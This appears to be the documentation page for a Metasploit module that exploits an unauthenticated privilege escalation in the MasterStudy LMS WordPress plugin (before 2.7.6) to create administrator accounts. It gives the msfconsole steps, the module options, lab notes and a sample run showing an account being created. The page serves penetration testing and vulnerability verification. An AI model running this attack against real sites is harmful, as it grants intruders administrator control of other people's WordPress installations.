## Vulnerable Application

MasterStudy LMS, a WordPress plugin,
prior to 2.7.6 is affected by a privilege escalation where an unauthenticated
user is able to create an administrator account for wordpress itself.

Download [MasterStudy 2.7.5](https://downloads.wordpress.org/plugin/masterstudy-lms-learning-management-system.2.7.5.zip).

[Container targets and automated verification](../../../../../test/module_targets/masterstudy/README.md)
provide pinned official 2.7.5 and 2.7.6 archives, genuine registration controls,
public module calls, credential reporting and independent account/login/privilege
checks. The lab uses WordPress 6.8.3, PHP 8.3.28 and MariaDB 11.2.2.

On that runtime, the original capability-field request on 2.7.6 raises a vendor
PHP error after creating a subscriber. Its login works but administrator access
is denied; ordinary registration remains functional. This is a measured boundary
for the selected request, not a whole-plugin security claim.

The module retains accounts it creates. The automated lab removes only its own
observed accounts after checking ID, username, email, password and session agents.
Email delivery is disabled in the lab; activation/premoderation, CAPTCHA and
other runtime configurations remain unqualified.

## Verification Steps

  1. `msfconsole`
  2. `use auxiliary/admin/http/wp_masterstudy_privesc`
  3. `set RHOSTS <rhost>`
  4. `run`

## Options

### USERNAME

Set a `USERNAME` if desirable. Defaults to empty, and random generation.

### PASSWORD

Set a `PASSWORD` if desirable. A blank value generates 13 characters including
lowercase, uppercase and a digit to meet the plugin's password policy. Explicit
nonblank values are passed unchanged and may be rejected by the target policy.

### EMAIL

Set a `EMAIL` if desirable. Defaults to empty, and random generation.

### DB_PREFIX

Advanced option for the target's WordPress database table prefix, defaulting to
`wp_`. Use the actual installation prefix, such as `lab_`; an empty value supports
unprefixed tables. This is independent of the WordPress URL path. The module does
not discover it automatically.

A wrong prefix can still create a subscriber and print registration success.
That output alone does not prove administrator access. The automated targets
verify the resulting role and authenticated access independently.

## Scenarios

### MasterStudy 2.7.5 on WordPress 5.7.5

```
[*] Processing masterstudy.rb for ERB directives.
resource (masterstudy.rb)> use auxiliary/admin/http/wp_masterstudy_privesc
resource (masterstudy.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (masterstudy.rb)> set verbose true
verbose => true
resource (masterstudy.rb)> run
[*] Running module against 1.1.1.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/masterstudy-lms-learning-management-system/readme.txt
[*] Found version 2.7.5 in the plugin
[+] The target appears to be vulnerable.
[*] Attempting with username: ujukzntw7 password: TbxjFm0znF email: ashley.thompson@gcvz2cibu.org
[+] Account Created Successfully
[*] Auxiliary module execution completed
```
